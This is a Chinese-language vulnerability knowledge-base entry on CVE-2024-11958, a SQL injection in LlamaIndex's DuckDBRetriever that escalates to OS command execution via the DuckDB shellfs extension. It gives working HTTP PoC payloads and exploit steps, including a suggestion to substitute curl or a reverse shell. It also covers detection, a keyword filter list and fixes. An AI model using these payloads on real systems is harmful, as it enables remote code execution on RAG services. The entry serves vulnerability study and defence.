---
id: web-generic-sqli-llamaindex-duckdb-shellfs-rce
title: LlamaIndex DuckDBRetriever match_bm25 SQL 注入 + shellfs 管道执行命令（CVE-2024-11958）
type: scenario
domain: web
path: web/generic/sqli
technique: duckdb-sqli-shellfs-command-execution
tags:
- web
- sqli
- duckdb
- llamaindex
- rce
- shellfs
- extension
- rag
cve:
- CVE-2024-11958
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: <0.4.0
verification:
  verified_by: verifier-V163
  verified_at: '2026-11-06T13:42:42+08:00'
  notes: 已对照原文与 5 张图核对：match_bm25 拼接注入、') as score... 堆叠 INSTALL/LOAD shellfs、read_csv('calc.exe 123|') 执行，calc.exe 截图与补丁 commit 一致；affected_versions <0.4.0 来自原文 requirements；未在本机复跑
url: /docs/web/generic/sqli/web-generic-sqli-llamaindex-duckdb-shellfs-rce/
draft: false
kb_aliases:
- CVE-2024-11958
- LlamaIndex SQL2RCE
- DuckDBRetriever SQL 注入
- shellfs 扩展 RCE
- match_bm25 注入
- read_csv 管道命令执行
---

## 一句话结论

LlamaIndex 的 `DuckDBRetriever._retrieve()` 把用户传入的查询字符串直接拼进 `match_bm25(..., '{query}')` 并用 `conn.execute(sql)` 执行，未使用预处理语句；攻击者闭合引号后堆叠任意 SQL，先 `INSTALL shellfs FROM community; LOAD shellfs;`，再用 `read_csv('<命令>|')` 让 DuckDB 通过 shell 管道执行系统命令，形成 SQL 注入到 RCE 的完整链。

## 原理

- **SQL 注入点**：`_retrieve` 用 f-string 构造
  `SELECT fts_main_<table>.match_bm25(<id_col>, '{query}') AS score, ... FROM <table> ...`，
  其中 `{query}` 来自 `query_bundle.query_str`（用户输入），未转义、未参数化；`conn.execute(sql)` 直接执行拼接后的 SQL。
- **DuckDB 支持多语句**：注入 `') as score, node_id, text from documents; ...` 可提前闭合 `match_bm25` 调用并结束 SELECT，随后用分号堆叠 `INSTALL`、`LOAD`、`SELECT` 等语句；末尾再用 `select concat('0` 之类把剩余部分包成字符串，避免语法错误。
- **扩展加载**：DuckDB 允许 `INSTALL shellfs FROM community; LOAD shellfs;` 安装/加载社区扩展；`shellfs` 为 DuckDB 提供 Unix 管道输入输出能力。
- **管道即命令执行**：shellfs 把文件名后的 `|` 解释为“执行前面的命令并捕获输出”、文件名前的 `|` 解释为输出管道。因此 `read_csv('calc.exe 123|')` 会执行 `calc.exe 123`，把标准输出当作 CSV 读取；命令执行不依赖写文件或 UDF，绕过了常规“只读查询”的假设。
- **为什么成立**：应用把“检索查询”当作纯文本，但 DuckDB 的 SQL 方言允许堆叠语句与扩展管理；扩展一旦加载即可访问进程/文件系统资源。SQL 注入的危害从数据读取升级为宿主命令执行。

## 触发条件

- 使用受影响的 `llama-index-retrievers-duckdb-retriever`（原文依赖标记 `<0.4.0`，CVE-2024-11958），且 `DuckDBRetriever.retrieve()` 接收用户可控的查询字符串。
- 应用未对查询做参数化/转义，也没有禁用多语句、扩展安装或将 DuckDB 限制在只读沙箱。
- DuckDB 进程可安装/加载 shellfs（能访问社区扩展，或目标已预装 shellfs），且运行账户有执行系统命令的权限。
- 目标为 Windows 时可用 `calc.exe` 验证；Linux/macOS 可换成 `id`/`whoami`/`touch` 等。

## 利用步骤

1. 确认检索接口（如 Flask `POST /ask`，JSON `{"question": "..."}`）把 `question` 传入 `DuckDBRetriever.retrieve()`。
2. 构造注入：先闭合 `match_bm25(..., '` 的字符串与函数调用，并补全 SELECT 列，使原 SQL 语法成立：
   `test') as score, node_id, text from documents;`
3. 堆叠扩展安装/加载：
   `install shellfs from community; load shellfs;`
4. 用 shellfs 管道执行命令并读取输出：
   `select * from read_csv('calc.exe 123|');`
5. 用 `select concat('0` 收尾，平衡原 SQL 末尾剩余的单引号/括号，避免解析错误。
6. 发送请求，观察命令是否执行（示例弹出计算器）；将 `calc.exe 123` 换成 `whoami`、`curl`、反弹 shell 等命令。

## PoC

```http
POST /ask HTTP/1.1
Host: 127.0.0.1:7001
Content-Type: application/json
Content-Length: 165

{"question":"test') as score, node_id, text from documents; install shellfs from community; load shellfs; select * from read_csv('calc.exe 123|'); select concat('0"}
```

原文在 Flask + DuckDBRetriever 环境复现：提交上述 JSON 后 `calc.exe 123` 被启动（截图显示计算器窗口），证明 SQL 注入可执行任意系统命令。

Linux 变体（将命令替换为 `id`）：

```json
{"question":"test') as score, node_id, text from documents; install shellfs from community; load shellfs; select * from read_csv('id|'); select concat('0"}
```

## 变体与关联

- **扩展变体**：`httpfs`/`shellfs` 等可加载扩展；若 shellfs 不可用，可尝试 DuckDB 的文件读写函数（`COPY ... TO`、`read_text`）做任意文件读写，再结合应用其他功能升级。
- **注入位置变体**：查询串不只进入 `match_bm25`，也可能进入 `LIMIT`、表名、列名等拼接点；参数化修复需覆盖所有动态 SQL 片段。
- **关联**：[[web-generic-sqli-llamaindex-duckdb-refdocid-copy-file-rce]]（另一个 LlamaIndex DuckDB SQL 注入，CVE-2025-1750，堆叠 COPY 文件读写）；[[ai-security-rag-security-chromadb-unauth-knowledge-base-poisoning]]（RAG 组件攻击面）。
- **边界**：DuckDB 配置禁用扩展安装/加载、`enable_external_access=false`、只读连接、无 shellfs 且无法联网安装时链会断；不同 DuckDB 版本的扩展行为可能变化。

## 检测与防御

- **参数化查询**：用 `conn.execute(sql, [query])` + `?` 占位符（官方补丁即此做法），不要 f-string 拼接；表名/列名等无法参数化的部分用白名单映射。
- **禁用扩展与外部访问**：设置 `allow_unsigned_extensions=false`、`autoinstall_known_extensions=false`、`autoload_known_extensions=false`、`enable_external_access=false`；生产环境不加载 shellfs/httpfs 等非必要扩展。
- **最小权限与隔离**：DuckDB 以低权限账户运行，限制文件系统与子进程；容器内禁止网络/命令执行；只读挂载数据库。
- **输入检测**：拦截 `'`、`;`、`INSTALL`、`LOAD`、`read_csv(`、`|` 等组合模式；但不要仅依赖黑名单。
- **检测**：DuckDB 日志出现 `INSTALL`/`LOAD`/`shellfs`/`read_csv` 管道；Web 进程派生 shell/计算器等子进程；检索接口响应时间异常或返回非预期列。
- **修复**：升级 `llama-index-retrievers-duckdb-retriever` 到 0.4.0 及以上（或应用对应 commit），并回归测试注入 payload 被当作普通字符串处理。
